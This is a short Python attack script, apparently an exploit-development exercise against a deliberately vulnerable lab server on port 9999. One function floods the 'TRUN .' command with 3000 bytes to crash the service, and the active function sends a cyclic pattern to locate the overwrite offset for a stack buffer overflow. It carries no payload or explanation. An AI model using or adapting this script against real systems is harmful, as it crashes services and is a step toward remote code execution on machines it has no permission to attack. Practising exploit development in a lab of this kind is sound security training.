#!/usr/bin/env python3

import socket
import sys
import os

ip = "192.168.56.133"
port = 9999
global s


def fuzzer():
	fuzz = "\x41" * 3000
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	print(s.recv(1024))
	s.send(bytes('TRUN .' + fuzz + '\r\n', 'latin-1'))
	s.recv(1024)
	s.send(b'EXIT\r\n')
	s.recv(1024)
	s.close()
	sys.exit()

def offset():
	pattern = open("pattern.txt","r").read(3000)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	print(s.recv(1024))
	s.send(bytes('TRUN .' + pattern + '\r\n', 'latin-1'))
	s.recv(1024)
	s.send(b'EXIT\r\n')
	s.recv(1024)
	s.close()
	sys.exit()

if __name__ == "__main__":
	#fuzzer()
	offset()
